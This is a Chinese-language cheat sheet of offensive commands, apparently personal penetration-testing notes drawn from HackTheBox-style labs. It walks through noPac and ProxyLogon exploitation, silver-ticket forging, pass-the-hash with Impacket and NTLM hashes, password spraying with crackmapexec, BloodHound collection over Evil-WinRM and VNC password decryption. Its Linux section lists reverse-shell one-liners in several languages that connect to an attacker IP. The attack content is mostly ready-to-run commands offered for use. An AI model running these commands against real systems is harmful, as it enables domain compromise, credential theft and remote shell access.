Rubeus.exe asktgt /user:"DC" /password:"root" /domain:"hack.com" /dc:"DC.hack.com" /nowrap /ptt
```



4.修改机器账户的saMAccountName属性为非域控

```shell
Import-Module .\Powermad.ps1
#查询机器账户的machine2$的saMAccountName 属性
Get-MachineAccountAttribute -MachineAccount machine2 -Attribute saMAccountName
#机器账户的machine2$的saMAccountName 属性修改为machine2$
Set-MachineAccountAttribute -MachineAccount machine2 -Value "machine2$" -Attribute saMAccountName -Verbose
```



5.请求高权限ST：

```shell
Rubeus.exe s4u /self /impersonateuser:"administrator" /altservice:"ldap/DC.hack.com" /dc:"DC.hack.com" /ptt /ticket:上一步请求的TGT的base64格式
```



利用脚本：https://github.com/Ridter/noPac



### Exchange ProxyLogon攻击

 https://github.com/hausec/ProxyLogon

或msf

```shell
#扫描目标exchange服务器是否存在proxylogon漏洞
auxiliary/scanner/http/exchange_proxylogon
#对proxylogon漏洞进行rce利用
exploit/windows/http/exchange_proxylogon_rce
```



TODO

### Exchange ProxyShell攻击

TODO



### 票据攻击

#### 黄金票据

TODO

#### 白银票据

当攻击者拥有指定服务的密钥，就能够伪造高权限的PAC，然后把其封装在ST里，并对其进行PAC_SERVER_CHECKSUM签名和加密。客户端再利用这个ST以高权限访问指定服务。这个攻击过程被称为白银票据传递攻击。



创建白银票据需要知道：

- 目标服务的密钥（即NTLM hash）
- 域的SID值
- 域名
- 要伪造的域用户，一般是Administrator。



1.得到密码（如果知道密码的话）：

```shell
python2
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().encode('hex')
```

2.获得域的SID值：

```shell
Get-ADDomain | fl DomainSID
```

3.得到票据：

```shell
python3.10 ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -spn MSSQLSvc/dc.sequel.htb -domain sequel.htb -domain-sid S-1-5-21-4078382237-1492182817-2568127209 administrator
```

```shell
export KRB5CCNAME=administrator.ccache
```

接下来使用smbexec.py等脚本的时候指定-k参数即可（但是为什么没打通。。。）。









### Impacket

https://www.freebuf.com/sectool/175208.html

包含很多有用的脚本



```shell
python3.10 mssqlclient.py  'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'

#启动本地的smb服务器，可以传文件到本地
python3.10 smbserver.py share ./share
#copy MultimasterAPI.dll \\10.10.14.14\share

python3.10 smbexec.py egotistical.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

python3.10 psexec.py htb.local/Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
```







### Evil-winrm

正常访问的是5985端口，如果要ssl访问的是5986端口。

```shell
Usage: evil-winrm -i IP -u USER -s SCRIPTS_PATH -e EXES_PATH [-P PORT] [-p PASS] [-U URL]
    -i, --ip IP                      远程主机IP或主机名（必填）
    -P, --port PORT                  远程主机端口（默认为5985）
    -u, --user USER                  用户名（必填）
    -p, --password PASS              密码
    -s, --scripts PS_SCRIPTS_PATH    Powershell脚本路径（必填）
    -e, --executables EXES_PATH      C#可执行文件路径（必填）
    -U, --url URL                    远程URL端点（默认为/wsman）
    -V, --version                    显示版本信息
    -h, --help                       显示帮助信息
```



```shell
upload local_path remote_path
download remote_path local_path
services：列出所有服务（无需管理员权限）。
menu：加载Invoke-Binary和l04d3r-LoadDll函数。当加载ps1时，会显示其所有功能。

要加载ps1文件，你只需键入名称（可以使用tab自动补全）。脚本必须位于-s参数中设置的路径中。再次键入menu并查看加载的功能。

Invoke-Binary：允许在内存中执行从c#编译的exes。该名称可使用tab键自动补全，最多允许3个参数。可执行文件必须在-e参数设置的路径中。

l04d3r-LoadDll：允许在内存中加载dll库。dll文件可以由smb，http或本地托管。一旦加载了menu菜单，就可以自动补全所有功能。
```

完整参数：

```shell
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

```



SSL访问：

```shell
evil-winrm -i 10.10.10.103  -S  -k amanda.key  -c certnew.cer
```

key的来源：

```shell
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

全enter即可。







### BloodHound

将SharpHound.exe上传后，执行，然后将执行的结果.zip下载下来：

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe

Info: Uploading /Users/feng/ctftools/Bloodhound/BloodHound-darwin-arm64/BloodHound/Collectors/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/11/2023   4:13 AM         791191 PowerView.ps1
-a----        9/11/2023   8:12 PM        1046528 SharpHound.exe
-a----        9/11/2023   3:47 AM        1391826 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ./SharpHound.exe
2023-09-11T20:14:03.0316761-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-09-11T20:14:03.2035095-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-11T20:14:03.2191572-07:00|INFORMATION|Initializing SharpHound at 8:14 PM on 9/11/2023
2023-09-11T20:14:03.5003889-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2023-09-11T20:14:03.6412294-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-11T20:14:04.1566415-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-09-11T20:14:04.2972645-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-09-11T20:14:04.2972645-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-09-11T20:14:34.2817054-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2023-09-11T20:14:49.6411107-07:00|INFORMATION|Consumers finished, closing output channel
2023-09-11T20:14:49.7036056-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-09-11T20:14:50.5943765-07:00|INFORMATION|Status: 162 objects finished (+162 3.521739)/s -- Using 48 MB RAM
2023-09-11T20:14:50.5943765-07:00|INFORMATION|Enumeration finished in 00:00:46.4524692
2023-09-11T20:14:50.7817293-07:00|INFORMATION|Saving cache with stats: 119 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-09-11T20:14:50.8442532-07:00|INFORMATION|SharpHound Enumeration Completed at 8:14 PM on 9/11/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/11/2023   8:14 PM          18914 20230911201448_BloodHound.zip
-a----        9/11/2023   8:14 PM          19676 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        9/11/2023   4:13 AM         791191 PowerView.ps1
-a----        9/11/2023   8:12 PM        1046528 SharpHound.exe
-a----        9/11/2023   3:47 AM        1391826 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20230911201448_BloodHound.zip

Info: Downloading C:\Users\svc-alfresco\Documents\20230911201448_BloodHound.zip to 20230911201448_BloodHound.zip

Info: Download successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```







BloodHound.py（拿到一个用户但是登不上去没法执行SharpHound.exe的时候使用）（mac上没用成功，装的docker）：

```shell
python3 bloodhound.py  -u support -p '#00^BlackKnight' -d blackfield.local --zip -c all -ns 10.10.10.192
```







### crackmapexec

Crackmapexec是一个后渗透的利用工具，可帮助自动执行一些任务，例如密码喷洒、枚举共享、验证本地管理员访问权限、在目标机器上执行命令等等。

支持的协议：

```shell
  {smb,winrm,ldap,mssql,ssh}
    smb                 own stuff using SMB
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    mssql               own stuff using MSSQL
    ssh                 own stuff using SSH
```



密码喷洒：

```shell
crackmapexec smb 10.10.10.169 -u user.txt -p 'Welcome123!' --continue-on-success
```

列举smb：

```shell
crackmapexec smb 10.10.10.192 -u "" -p "" --shares
```

### vncpwd

读到的vnc密码：vnc "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

```shell
echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
./vncpwd vnc_enc_pass
```





## Windows

### NTFS流

https://blog.csdn.net/x1183834753/article/details/124384108

https://xz.aliyun.com/t/2539







## Linux

### 反弹shell

```shell
#bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


#perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

#ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#nc
nc -e /bin/sh 10.0.0.1 1234


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

#java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


#xterm
xterm -display 10.0.0.1:1
Xnest :1
xhost +targetip


#
bash -c 'bash -i >& /dev/tcp/10.10.14.26/39502 0>&1'
```



### 提权

linpeas提权辅助工具。

linpeas.sh的信息比别的可执行文件会少。

```shell
sh linpeas.sh -w
```

不加-w会直接覆盖一整页





pspy可以列出正在运行的cron和进程：

```shell
./pspy64
```











1
